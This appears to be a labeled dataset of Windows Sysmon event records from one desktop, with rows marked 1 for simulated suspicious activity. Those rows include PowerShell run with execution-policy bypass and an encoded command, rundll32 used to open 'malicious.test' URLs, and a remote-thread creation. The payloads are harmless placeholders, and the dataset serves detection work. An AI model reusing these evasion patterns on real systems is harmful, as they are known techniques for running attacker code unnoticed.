File created: RuleName: - UtcTime: 2025-11-27 18:10:07.982 ProcessGuid: {3a35410f-93fe-6928-a915-000000000b00} ProcessId: 1800 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe TargetFilename: C:\Users\Emil Jinu\AppData\Local\Temp\__PSScriptPolicyTest_u2d3i11o.ua4.ps1 CreationUtcTime: 2025-11-27 18:10:07.982 User: DESKTOP-EJG8QJC\Emil Jinu,1
CreateRemoteThread detected: RuleName: - UtcTime: 2025-11-27 18:04:24.666 SourceProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} SourceProcessId: 4396 SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe TargetProcessGuid: {3a35410f-92a8-6928-5512-000000000b00} TargetProcessId: 6612 TargetImage: <unknown process> NewThreadId: 6376 StartAddress: 0x00007FF6970C30D0 StartModule: - StartFunction: - SourceUser: DESKTOP-EJG8QJC\Emil Jinu TargetUser: DESKTOP-EJG8QJC\Emil Jinu,1
"Process Create: RuleName: - UtcTime: 2025-11-27 18:01:23.683 ProcessGuid: {3a35410f-91f3-6928-610e-000000000b00} ProcessId: 428 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe FileVersion: 10.0.19041.3996 (WinBuild.160101.0800) Description: Windows PowerShell Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: PowerShell.EXE CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NoProfile -ExecutionPolicy Bypass -Command Write-Output 'PS 132'; Start-Sleep -Seconds 1 CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6 ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
Dns query: RuleName: - UtcTime: 2025-11-27 17:27:32.554 ProcessGuid: {00000000-0000-0000-0000-000000000000} ProcessId: 12868 QueryName: wpad QueryStatus: 123 QueryResults: - Image: <unknown process> User: DESKTOP-EJG8QJC\Emil Jinu,0
"Process Create: RuleName: - UtcTime: 2025-11-27 18:06:47.663 ProcessGuid: {3a35410f-9337-6928-5015-000000000b00} ProcessId: 10128 Image: C:\Windows\System32\wbem\WMIC.exe FileVersion: 10.0.19041.5794 (WinBuild.160101.0800) Description: WMI Commandline Utility Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: wmic.exe CommandLine: ""C:\Windows\System32\Wbem\WMIC.exe"" process get name CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=EBE8CE528A79B5CC0782E8DFDA250600,SHA256=DA603FA720AB43AA6D4D36AA9FDB828DAB9645523EABAAC209AF6451D5B4D757,IMPHASH=527C7C66CDD13D72D793BCA3A417BCBE ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
"Process Create: RuleName: - UtcTime: 2025-11-27 16:53:16.235 ProcessGuid: {3a35410f-81fc-6928-b705-000000000b00} ProcessId: 11256 Image: C:\Program Files (x86)\Microsoft\Edge\Application\142.0.3595.94\elevation_service.exe FileVersion: 142.0.3595.94 Description: Microsoft Edge Product: Microsoft Edge Company: Microsoft Corporation OriginalFileName: elevation_service.exe CommandLine: ""C:\Program Files (x86)\Microsoft\Edge\Application\142.0.3595.94\elevation_service.exe"" CurrentDirectory: C:\Windows\system32\ User: NT AUTHORITY\SYSTEM LogonGuid: {3a35410f-6567-6928-e703-000000000000} LogonId: 0x3E7 TerminalSessionId: 0 IntegrityLevel: System Hashes: MD5=B8A03699DAB76DB8803F0257B83E2076,SHA256=2FFC3935EF83744C535247FD92526E4E47294C58A26E390AF176FE15E7B411B6,IMPHASH=BFB8B0BD22010F251A9B8E92F1660D7B ParentProcessGuid: {3a35410f-6567-6928-0b00-000000000b00} ParentProcessId: 708 ParentImage: C:\Windows\System32\services.exe ParentCommandLine: C:\Windows\system32\services.exe ParentUser: NT AUTHORITY\SYSTEM",0
"Process Create: RuleName: - UtcTime: 2025-11-27 18:03:41.700 ProcessGuid: {3a35410f-927d-6928-cc10-000000000b00} ProcessId: 2060 Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe FileVersion: 142.1.84.141 Description: Brave Browser Product: Brave Browser Company: Brave Software, Inc. OriginalFileName: brave.exe CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --single-argument http://malicious.test/2 CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E ParentProcessGuid: {3a35410f-927d-6928-b810-000000000b00} ParentProcessId: 5500 ParentImage: C:\Windows\System32\rundll32.exe ParentCommandLine: ""C:\Windows\system32\rundll32.exe"" url.dll,FileProtocolHandler http://malicious.test/2 ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
"Process Create: RuleName: - UtcTime: 2025-11-27 17:57:04.367 ProcessGuid: {3a35410f-90f0-6928-0c09-000000000b00} ProcessId: 4388 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe FileVersion: 10.0.19041.3996 (WinBuild.160101.0800) Description: Windows PowerShell Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: PowerShell.EXE CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NoProfile -ExecutionPolicy Bypass -Command Write-Output 'PS 8'; Start-Sleep -Seconds 1 CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6 ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
"Process Create: RuleName: - UtcTime: 2025-11-27 18:03:48.400 ProcessGuid: {3a35410f-9284-6928-0511-000000000b00} ProcessId: 11844 Image: C:\Windows\System32\rundll32.exe FileVersion: 10.0.19041.5794 (WinBuild.160101.0800) Description: Windows host process (Rundll32) Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: RUNDLL32.EXE CommandLine: ""C:\Windows\system32\rundll32.exe"" url.dll,FileProtocolHandler http://malicious.test/5 CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=5A43032AEBD51583832EF3E96F5C81DA,SHA256=076592CA1957F8F357CC201F0015072C612F5770AD7DE85F87F254253C754DD7,IMPHASH=F207A867D6098266EE63A3CA677EB0FF ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
"Process Create: RuleName: - UtcTime: 2025-11-27 15:36:47.398 ProcessGuid: {3a35410f-700f-6928-4504-000000000b00} ProcessId: 11452 Image: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe FileVersion: 142.0.3595.94 Description: Microsoft Edge Product: Microsoft Edge Company: Microsoft Corporation OriginalFileName: msedge.exe CommandLine: ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --type=gpu-process --no-pre-read-main-dll --gpu-preferences=SAAAAAAAAADgAAAEAAAAAAAAAAAAAGAAAQAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAA== --startup-read-main-dll --metrics-shmem-handle=1996,i,13882406982053653505,6922374090986960319,262144 --field-trial-handle=2284,i,15516268460583269811,3696675730914894840,262144 --variations-seed-version --trace-process-track-uuid=3190708988185955192 --mojo-platform-channel-handle=2388 /prefetch:2 CurrentDirectory: C:\Program Files (x86)\Microsoft\Edge\Application\142.0.3595.94\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-c9e6-200000000000} LogonId: 0x20E6C9 TerminalSessionId: 1 IntegrityLevel: Low Hashes: MD5=CC88E8CBC96E0183F15A240EC2E6D7BB,SHA256=C089768E72071ACA205E6B77C0538F58A3896CE5B0F65BA9BD38CDAE263D8A03,IMPHASH=4C2A67DEB457B8BF9F317820EE11E05D ParentProcessGuid: {3a35410f-700f-6928-4104-000000000b00} ParentProcessId: 13500 ParentImage: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe ParentCommandLine: ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --no-startup-window ParentUser: DESKTOP-EJG8QJC\Emil Jinu",0
"Process Create: RuleName: - UtcTime: 2025-11-27 18:03:47.504 ProcessGuid: {3a35410f-9283-6928-0211-000000000b00} ProcessId: 7380 Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe FileVersion: 142.1.84.141 Description: Brave Browser Product: Brave Browser Company: Brave Software, Inc. OriginalFileName: brave.exe CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --type=renderer --enable-distillability-service --origin-trial-public-key=bYUKPJoPnCxeNvu72j4EmPuK7tr1PAC7SHh8ld9Mw3E=,fMS4mpO6buLQ/QMd+zJmxzty/VQ6B1EUZqoCU04zoRU= --disable-gpu-compositing --video-capture-use-gpu-memory-buffer --lang=en-US --device-scale-factor=1 --num-raster-threads=2 --enable-main-frame-before-activation --renderer-client-id=12 --time-ticks-at-unix-epoch=-1764255096121325 --launch-time-ticks=11531768224 --metrics-shmem-handle=5032,i,13518024071006376411,9943362722017472589,2097152 --field-trial-handle=2116,i,4317584078096433513,18029839939329323353,262144 --variations-seed-version=main@69c2005032bb14f803911c3458ab063c42bfa450 --trace-process-track-uuid=3190708997556373682 --mojo-platform-channel-handle=4236 /prefetch:1 CurrentDirectory: C:\Program Files\BraveSoftware\Brave-Browser\Application\142.1.84.141\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-c9e6-200000000000} LogonId: 0x20E6C9 TerminalSessionId: 1 IntegrityLevel: Low Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E ParentProcessGuid: {3a35410f-927d-6928-c610-000000000b00} ParentProcessId: 11048 ParentImage: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe ParentCommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --disable-domain-reliability --enable-dom-distiller --enable-distillability-service --origin-trial-public-key=bYUKPJoPnCxeNvu72j4EmPuK7tr1PAC7SHh8ld9Mw3E=,fMS4mpO6buLQ/QMd+zJmxzty/VQ6B1EUZqoCU04zoRU= --lso-url=https://no-thanks.invalid --variations-server-url=https://variations.brave.com/seed --variations-insecure-server-url=https://variations.brave.com/seed --flag-switches-begin --flag-switches-end --component-updater=url-source=https://go-updater.brave.com/extensions --do-not-de-elevate --single-argument http://malicious.test/1 ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
"Process Create: RuleName: - UtcTime: 2025-11-27 14:59:40.972 ProcessGuid: {3a35410f-675c-6928-e901-000000000b00} ProcessId: 9556 Image: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe FileVersion: 142.0.3595.94 Description: Microsoft Edge Product: Microsoft Edge Company: Microsoft Corporation OriginalFileName: msedge.exe CommandLine: ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --type=utility --utility-sub-type=edge_xpay_wallet.mojom.EdgeXPayWalletService --lang=en-US --service-sandbox-type=utility --skip-read-main-dll --metrics-shmem-handle=7528,i,7464546789626658205,7712309350502472841,524288 --field-trial-handle=2260,i,1547719188676437899,16852525804210529371,262144 --variations-seed-version --trace-process-track-uuid=3190709009737917719 --mojo-platform-channel-handle=7428 /prefetch:8 CurrentDirectory: C:\Program Files (x86)\Microsoft\Edge\Application\142.0.3595.94\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-c9e6-200000000000} LogonId: 0x20E6C9 TerminalSessionId: 1 IntegrityLevel: Low Hashes: MD5=CC88E8CBC96E0183F15A240EC2E6D7BB,SHA256=C089768E72071ACA205E6B77C0538F58A3896CE5B0F65BA9BD38CDAE263D8A03,IMPHASH=4C2A67DEB457B8BF9F317820EE11E05D ParentProcessGuid: {3a35410f-6617-6928-5301-000000000b00} ParentProcessId: 8340 ParentImage: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe ParentCommandLine: ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --no-startup-window --win-session-start ParentUser: DESKTOP-EJG8QJC\Emil Jinu",0
"Process Create: RuleName: - UtcTime: 2025-11-27 18:10:50.984 ProcessGuid: {3a35410f-942a-6928-2917-000000000b00} ProcessId: 15996 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe FileVersion: 10.0.19041.3996 (WinBuild.160101.0800) Description: Windows PowerShell Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: PowerShell.EXE CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAEUANAAxACcA CurrentDirectory: C:\Users\Emil Jinu\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-c9e6-200000000000} LogonId: 0x20E6C9 TerminalSessionId: 1 IntegrityLevel: Medium Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6 ParentProcessGuid: {3a35410f-93eb-6928-6715-000000000b00} ParentProcessId: 6344 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
Registry value set: RuleName: T1122 EventType: SetValue UtcTime: 2025-11-27 17:27:43.216 ProcessGuid: {3a35410f-8a0e-6928-1b07-000000000b00} ProcessId: 14228 Image: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\OneDrive.exe TargetObject: HKU\S-1-5-21-3351607045-2108423416-1727308141-1001_Classes\CLSID\{CB3D0F55-BC2C-4C1A-85ED-23ED75B5106B}\InprocServer32\(Default) Details: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\25.209.1026.0002\FileSyncShell64.dll User: DESKTOP-EJG8QJC\Emil Jinu,0
File created: RuleName: - UtcTime: 2025-11-27 18:02:14.961 ProcessGuid: {3a35410f-9223-6928-510f-000000000b00} ProcessId: 14064 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe TargetFilename: C:\Users\Emil Jinu\AppData\Local\Temp\__PSScriptPolicyTest_f41epb31.z4i.ps1 CreationUtcTime: 2025-11-27 18:02:14.961 User: DESKTOP-EJG8QJC\Emil Jinu,1
"Process Create: RuleName: - UtcTime: 2025-11-27 16:52:26.624 ProcessGuid: {3a35410f-81ca-6928-aa05-000000000b00} ProcessId: 5604 Image: C:\Windows\explorer.exe FileVersion: 10.0.19041.6456 (WinBuild.160101.0800) Description: Windows Explorer Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: EXPLORER.EXE CommandLine: ""C:\Windows\explorer.exe"" CurrentDirectory: C:\Users\Emil Jinu\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-c9e6-200000000000} LogonId: 0x20E6C9 TerminalSessionId: 1 IntegrityLevel: Medium Hashes: MD5=24AD59ABAF730E71BC865922D8596008,SHA256=988A56D897915315EEF9CA679B3BC8ADFCECF5E227AEA99AAA1817620520E97E,IMPHASH=DBCE632ECED8243CB6090C1C87BE56BC ParentProcessGuid: {3a35410f-717b-6928-7704-000000000b00} ParentProcessId: 9908 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",0
Dns query: RuleName: - UtcTime: 2025-11-27 16:51:22.141 ProcessGuid: {3a35410f-8185-6928-7605-000000000b00} ProcessId: 6160 QueryName: wpad QueryStatus: 123 QueryResults: - Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe User: DESKTOP-EJG8QJC\Emil Jinu,0
Dns query: RuleName: - UtcTime: 2025-11-27 16:51:31.964 ProcessGuid: {3a35410f-8185-6928-7605-000000000b00} ProcessId: 6160 QueryName: yt3.ggpht.com QueryStatus: 0 QueryResults: 172.217.24.193;142.250.67.33;142.250.206.1;142.251.222.129;142.251.221.193;142.250.77.97;142.250.205.65;142.251.221.161;142.250.66.1;142.250.205.129;142.250.205.97;142.251.43.33;142.251.222.193;142.250.205.1;142.251.222.161;142.250.206.65; Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe User: DESKTOP-EJG8QJC\Emil Jinu,0
File created: RuleName: - UtcTime: 2025-11-27 18:01:34.554 ProcessGuid: {3a35410f-91fb-6928-820e-000000000b00} ProcessId: 3336 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe TargetFilename: C:\Users\Emil Jinu\AppData\Local\Temp\__PSScriptPolicyTest_dqt0rkcl.2dp.ps1 CreationUtcTime: 2025-11-27 18:01:34.554 User: DESKTOP-EJG8QJC\Emil Jinu,1
"Process Create: RuleName: - UtcTime: 2025-11-27 18:05:15.168 ProcessGuid: {3a35410f-92db-6928-a613-000000000b00} ProcessId: 15968 Image: C:\Windows\System32\SecurityHealthHost.exe FileVersion: 4.18.1907.16384 (WinBuild.160101.0800) Description: Windows Security Health Host Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: SecurityHealthHost.exe CommandLine: C:\Windows\System32\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-c9e6-200000000000} LogonId: 0x20E6C9 TerminalSessionId: 1 IntegrityLevel: Medium Hashes: MD5=BC84EF67269A2AEF02EBA5AA8FB69BEC,SHA256=08C05285CE0BA345A39C08D70D6686706CDCB847A220A1CA34F5BFECC8CD8857,IMPHASH=4E28FDA241BEFA94F219E0683850258F ParentProcessGuid: {3a35410f-6567-6928-0d00-000000000b00} ParentProcessId: 848 ParentImage: C:\Windows\System32\svchost.exe ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch -p ParentUser: NT AUTHORITY\SYSTEM",1
Registry value set: RuleName: InvDB-Path EventType: SetValue UtcTime: 2025-11-27 16:04:35.065 ProcessGuid: {3a35410f-656a-6928-3e00-000000000b00} ProcessId: 2740 Image: C:\Windows\System32\svchost.exe TargetObject: \REGISTRY\A\{9309e89c-9321-cf1a-3889-0090faa6586f}\Root\InventoryApplicationFile\defrag.exe|ebd85d04fc6a26d\LowerCaseLongPath Details: c:\windows\system32\defrag.exe User: NT AUTHORITY\SYSTEM,0
"Process Create: RuleName: - UtcTime: 2025-11-27 17:57:35.791 ProcessGuid: {3a35410f-910f-6928-9909-000000000b00} ProcessId: 7324 Image: C:\Windows\System32\cmd.exe FileVersion: 10.0.19041.4355 (WinBuild.160101.0800) Description: Windows Command Processor Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: Cmd.Exe CommandLine: ""C:\Windows\system32\cmd.exe"" /c echo proc 21 & timeout /t 1 >nul CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18 ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
Registry value set: RuleName: - EventType: SetValue UtcTime: 2025-11-27 17:27:58.417 ProcessGuid: {3a35410f-8a1d-6928-3007-000000000b00} ProcessId: 1048 Image: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\OneDrive.exe TargetObject: HKU\S-1-5-21-3351607045-2108423416-1727308141-1001_Classes\Directory\shellex\ContextMenuHandlers\ FileSyncEx\(Default) Details: {CB3D0F55-BC2C-4C1A-85ED-23ED75B5106B} User: DESKTOP-EJG8QJC\Emil Jinu,0
"Process Create: RuleName: - UtcTime: 2025-11-27 18:01:57.190 ProcessGuid: {3a35410f-9215-6928-0b0f-000000000b00} ProcessId: 7656 Image: C:\Windows\System32\certutil.exe FileVersion: 10.0.19041.5794 (WinBuild.160101.0800) Description: CertUtil.exe Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: CertUtil.exe CommandLine: ""C:\Windows\system32\certutil.exe"" -hashfile C:\Windows\win.ini SHA256 CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=E6384AD54B07F9783135586C71F82D1C,SHA256=FD1670B43E2D9188B12B233780BF043C5A90A67A2C6E3FCDC564A5C246531BC2,IMPHASH=5AFC8346D5AFF4A4862E8A7C91042465 ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
"Process Create: RuleName: - UtcTime: 2025-11-27 15:10:24.055 ProcessGuid: {3a35410f-69e0-6928-b702-000000000b00} ProcessId: 8608 Image: C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.19041.6449_none_7e0d59887c8e1467\TiWorker.exe FileVersion: 10.0.19041.6449 (WinBuild.160101.0800) Description: Windows Modules Installer Worker Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: TiWorker.exe CommandLine: C:\Windows\winsxs\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.19041.6449_none_7e0d59887c8e1467\TiWorker.exe -Embedding CurrentDirectory: C:\Windows\system32\ User: NT AUTHORITY\SYSTEM LogonGuid: {3a35410f-6567-6928-e703-000000000000} LogonId: 0x3E7 TerminalSessionId: 0 IntegrityLevel: System Hashes: MD5=C814A5844B037DF5271494CE580837B2,SHA256=606D88DADCDE114EEE163B871B88BFB2FFC562D122A6A1102B970E68142A2914,IMPHASH=2409EC1E105B0DDA91B9CEBA0B44162F ParentProcessGuid: {3a35410f-6567-6928-0d00-000000000b00} ParentProcessId: 848 ParentImage: C:\Windows\System32\svchost.exe ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch -p ParentUser: NT AUTHORITY\SYSTEM",0
"Process Create: RuleName: - UtcTime: 2025-11-27 18:00:30.276 ProcessGuid: {3a35410f-91be-6928-560d-000000000b00} ProcessId: 14668 Image: C:\Windows\System32\cmd.exe FileVersion: 10.0.19041.4355 (WinBuild.160101.0800) Description: Windows Command Processor Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: Cmd.Exe CommandLine: ""C:\Windows\system32\cmd.exe"" /c echo proc 108 & timeout /t 1 >nul CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18 ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
